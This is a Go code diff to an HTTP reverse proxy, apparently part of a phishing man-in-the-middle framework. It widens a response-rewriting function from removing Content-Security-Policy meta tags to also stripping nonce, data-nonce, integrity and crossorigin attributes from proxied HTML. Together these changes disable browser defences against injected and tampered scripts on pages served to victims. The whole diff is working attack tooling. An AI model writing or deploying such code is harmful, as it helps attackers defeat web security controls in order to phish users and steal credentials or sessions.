@@ -92,14 +92,30 @@ type ProxySession struct {
 	Index        int
 }
 
-func (p *HttpProxy) removeCSPMetaTags(body []byte) []byte {
-	// Regex para encontrar meta tags CSP
+func (p *HttpProxy) removeSecurityMechanisms(body []byte) []byte {
+	html := string(body)
+
+	// 1. Remover meta CSP
 	cspMetaRegex := regexp.MustCompile(`<meta[^>]*http-equiv=['"]Content-Security-Policy['"][^>]*>`)
+	html = cspMetaRegex.ReplaceAllString(html, "")
 
-	// Remover todas as meta tags CSP
-	body = cspMetaRegex.ReplaceAllLiteral(body, []byte{})
+	// 2. Remover atributos nonce="..."
+	nonceRegex := regexp.MustCompile(`\snonce=['"][^'"]*['"]`)
+	html = nonceRegex.ReplaceAllString(html, "")
 
-	return body
+	// 3. Remover atributos data-nonce="..."
+	dataNonceRegex := regexp.MustCompile(`\sdata-nonce=['"][^'"]*['"]`)
+	html = dataNonceRegex.ReplaceAllString(html, "")
+
+	// 4. Remover atributos integrity="sha..."
+	integrityRegex := regexp.MustCompile(`\sintegrity=['"][^'"]*['"]`)
+	html = integrityRegex.ReplaceAllString(html, "")
+
+	// 5. Remover atributos crossorigin="..."
+	crossoriginRegex := regexp.MustCompile(`\scrossorigin=['"][^'"]*['"]`)
+	html = crossoriginRegex.ReplaceAllString(html, "")
+
+	return []byte(html)
 }
 
 // set the value of the specified key in the JSON body
@@ -1188,7 +1204,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				body = p.removeCSPMetaTags(body)
+				body = p.removeSecurityMechanisms(body)
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
